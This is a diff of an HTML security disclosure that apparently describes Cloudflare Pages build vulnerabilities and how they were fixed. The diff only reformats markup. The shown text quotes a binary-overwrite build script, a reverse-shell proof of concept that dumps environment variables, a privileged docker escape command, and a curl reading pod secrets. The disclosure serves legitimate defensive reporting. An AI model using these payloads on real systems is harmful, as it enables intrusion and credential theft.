@@ -29,14 +29,12 @@
 	<p>This bug is nearly identical to the first one, but on the publishing step instead of the clone step. We went to work rotating the secrets that were exposed, fixing the input validation issues, and rotating the exposed secrets. We investigated the Cloudflare audit logs to confirm that the sensitive credentials had not been used by anyone other than our build infrastructure, and within the scope of the security research being performed.</p>
 	<h3 id="bug-3-cloudflare-api-key-disclosure-in-the-asset-publishing-process">Bug 3: Cloudflare API key disclosure in the asset publishing process</h3>
 	<p>While building customer pages, a program called /opt/pages/bin/pages-metadata-generator is involved. This program had the Linux permissions of 777, allowing all users on the machine to read the program, execute the program, but most importantly overwrite the program. If you can overwrite the program prior to its invocation, the program might run with higher permissions when the next user comes along and wants to use it.</p>
-	<p>In this case the attack is simple. When a Pages build runs, the following <code>build.sh</code> is specified to run, and it can overwrite the executable with a new one.</p>
-	<!--kg-card-begin: markdown-->
+	<p>In this case the attack is simple. When a Pages build runs, the following <code>build.sh</code> is specified to run, and it can overwrite the executable with a new one.</p><!--kg-card-begin: markdown-->
 	<pre><code>#!/bin/bash
 cp pages-metadata-generator /opt/pages/bin/pages-metadata-generator
 </code></pre>
 	<!--kg-card-end: markdown-->
-	<p>This allows the attacker to provide their own <code>pages-metadata-generator</code> program that is run with a populated set of environment variables. The proof of concept provided to Cloudflare was this minimal reverse shell.</p>
-	<!--kg-card-begin: markdown-->
+	<p>This allows the attacker to provide their own <code>pages-metadata-generator</code> program that is run with a populated set of environment variables. The proof of concept provided to Cloudflare was this minimal reverse shell.</p><!--kg-card-begin: markdown-->
 	<pre><code>#!/bin/bash
 echo "henlo fren"
 export &gt; /tmp/envvars
@@ -49,8 +47,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 	<p><code>PATH=/opt/buildhome/.swiftenv/bin:/opt/buildhome/.swiftenv/shims:/opt/buildhome/.php:/opt/buildhome/.binrc/bin:/usr/local/rvm/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/buildhome/.cask/bin:/opt/buildhome/.gimme/bin:/opt/buildhome/.dotnet/tools:/opt/buildhome/.dotnet</code></p>
 	<p>Unfortunately not all of these directories were set to the proper filesystem permissions allowing a malicious version of the program bash to be written to them, and later invoked by the Pages build process. We patched this bug, rotated the impacted credentials, and investigated in Cloudflare audit logs to confirm that the sensitive credentials had not been used by anyone other than our build infrastructure, and within the scope of the security research.</p>
 	<h3 id="bug-5-azure-pipelines-escape">Bug 5: Azure pipelines escape</h3>
-	<p>Back when this research was conducted we were running Cloudflare Pages on Azure Pipelines. Builds were taking place in highly privileged containers and the containers had the docker socket available to them. Once the researchers had root within these containers, escaping them was trivial after installing docker and mounting the root directory of the host machine.</p>
-	<!--kg-card-begin: markdown-->
+	<p>Back when this research was conducted we were running Cloudflare Pages on Azure Pipelines. Builds were taking place in highly privileged containers and the containers had the docker socket available to them. Once the researchers had root within these containers, escaping them was trivial after installing docker and mounting the root directory of the host machine.</p><!--kg-card-begin: markdown-->
 	<pre><code>sudo docker run -ti --privileged --net=host -v /:/host -v /dev:/dev -v /run:/run ubuntu:latest
 </code></pre>
 	<!--kg-card-end: markdown-->
@@ -58,8 +55,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 	<p>The credentials that were recovered gave access to highly audited APIs where we could validate that this issue was not previously exploited outside this security research.</p>
 	<h3 id="bug-6-pages-on-kubernetes">Bug 6: Pages on Kubernetes</h3>
 	<p>After receipt of the above bugs, &nbsp;we decided to change the architecture &nbsp;of Pages. One of these changes was migration of the product from Azure to Kubernetes, and simplifying the workflow, so the attack surface was smaller and defensive programming practices were easier to implement. After the change, Pages builds are within Kubernetes Pods and are seeded with the minimum set of credentials needed.</p>
-	<p>As part of this migration, we left off a very important iptables rule in our Kubernetes control plane, making it easy to <code>curl</code> the Kubernetes API and read secrets related to other Pods in the cluster (each Pod representing a separate Pages build).</p>
-	<!--kg-card-begin: markdown-->
+	<p>As part of this migration, we left off a very important iptables rule in our Kubernetes control plane, making it easy to <code>curl</code> the Kubernetes API and read secrets related to other Pods in the cluster (each Pod representing a separate Pages build).</p><!--kg-card-begin: markdown-->
 	<pre><code>curl -v -k [http://10.124.200.1:10255/pods](http://10.124.200.1:10255/pods)
 </code></pre>
 	<!--kg-card-end: markdown-->
